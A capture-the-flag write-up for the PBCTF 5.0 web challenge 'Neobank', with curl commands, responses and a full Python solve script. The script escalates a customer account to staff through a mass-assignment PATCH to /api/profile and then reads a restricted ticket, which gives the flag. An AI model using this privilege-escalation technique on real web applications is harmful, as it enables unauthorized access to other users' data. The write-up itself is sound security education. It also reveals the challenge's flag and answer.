---
title: "Neobank"
ctf: "PBCTF 5.0 (Point Blank CTF)"
date: 2026-07-26
category: web
difficulty: medium
points: ?
flag_format: "pbctf{...}"
author: "vikas1337"
---

# Neobank

## summary

vanilla flask bank. u register as a normal customer (session cookie is just {"uid":99}), the settings page only lets u edit display_name+email but PATCH /api/profile is mass-assignable so u smuggle role:staff, then IDOR the staff-only support ticket #4 which has the flag in the body.

## how i solved it

### 1. map the app

```bash
B=https://neobank-pbctf.vercel.app
curl -s -D - $B/ -o /dev/null | grep -i location
curl -s $B/register | grep -iE 'form|input name'
```

```text
location: /register
<form method="post">
  <input id="username" name="username" ...>
  <input id="password" name="password" type="password" ...>
# just a plain html register form, no api/json
```

### 2. register -> look at the session cookie

```bash
curl -s -c cj.txt -d 'username=hax19265&password=pass12345' $B/register -D - -o /dev/null | grep -i set-cookie
```

```text
set-cookie: session=eyJ1aWQiOjk5fQ.amXkxg.sx1lxQHfs4BeoCtwbvkt8yBZgCs; HttpOnly; Path=/
# base64 of the first part = {"uid":99}. just a customer id, role lives server-side.
```

### 3. enumerate tickets, #4 is gated

```bash
for i in 1 2 3 4 5 6; do echo -n "#$i: "; curl -s -b cj.txt $B/api/tickets/$i; echo; done
```

```text
#1: {"body":"Hi, my card was declined in Lisbon...","visibility":"public"}
#2: {"body":"You can download a PDF...","visibility":"public"}
#3: {"body":"Latest update crashes...","visibility":"public"}
#4: {"error":"forbidden: staff role required"}
#5: {"error":"ticket not found"}
#6: {"error":"ticket not found"}
```

### 4. the settings ui only sends display_name+email

```text
# saveProfile() in /settings PATCHes /api/profile with {display_name,email}.
# but the response echoes a 'role' field and there's a #role-badge in the dom.
# classic mass-assignment: server blindly merges whatever json u send.
```

```text
<span class="badge role" id="role-badge">customer</span>
```

### 5. smuggle role:staff via PATCH, then grab ticket 4

```bash
curl -s -b cj.txt -X PATCH -H 'Content-Type: application/json' -d '{"role":"staff"}' $B/api/profile; echo
curl -s -b cj.txt $B/api/tickets/4
```

```text
{"display_name":"hax","email":"h@x","role":"staff"}
{"body":"Internal audit note (staff only). Reconciliation flag: pbctf{d0nt_l00k_Beh1nd_you}","id":4,"subject":"RESTRICTED: Q3 reconciliation key","visibility":"internal"}
```

## full solve script

```python
#!/usr/bin/env python3
# neobank.py - register a customer, mass-assign staff, IDOR the internal ticket
import urllib.request, urllib.parse, http.cookiejar, json, random

B = 'https://neobank-pbctf.vercel.app'
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def post_form(path, **kw):
    d = urllib.parse.urlencode(kw).encode()
    return op.open(urllib.request.Request(B+path, data=d)).read()

def req(path, method='GET', body=None):
    h = {'Content-Type':'application/json'} if body else {}
    r = urllib.request.Request(B+path, data=body, headers=h, method=method)
    try: return op.open(r).read().decode()
    except urllib.error.HTTPError as e: return e.read().decode()

# 1) open a fresh checking account (plain html form). session cookie = {"uid":99}
u = 'hax%d' % random.randint(1000,9999)
post_form('/register', username=u, password='pass12345')
print('registered', u)

# 2) UI only lets u PATCH display_name+email. try smuggling role -> mass-assign.
print('patch ->', req('/api/profile', 'PATCH', b'{"role":"staff"}'))

# 3) ticket #4 was staff-only ("forbidden: staff role required"). now IDOR it.
print(req('/api/tickets/4'))
```

```text
registered hax4821
patch -> {"display_name":"","email":"","role":"staff"}
{"body":"Internal audit note (staff only). Reconciliation flag: pbctf{d0nt_l00k_Beh1nd_you}","id":4,"subject":"RESTRICTED: Q3 reconciliation key","visibility":"internal"}
```

## flag

```
pbctf{d0nt_l00k_Beh1nd_you}
```
